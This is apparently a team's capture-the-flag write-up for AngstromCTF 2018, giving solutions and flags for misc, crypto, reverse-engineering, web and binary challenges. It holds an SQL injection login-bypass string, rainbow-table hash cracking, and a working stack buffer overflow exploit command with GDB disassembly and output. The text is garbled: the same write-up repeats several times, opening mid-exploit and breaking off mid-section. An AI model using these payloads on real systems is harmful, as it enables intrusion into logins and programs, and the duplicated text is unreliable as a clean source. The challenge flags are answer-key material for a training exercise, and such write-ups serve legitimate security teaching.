End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
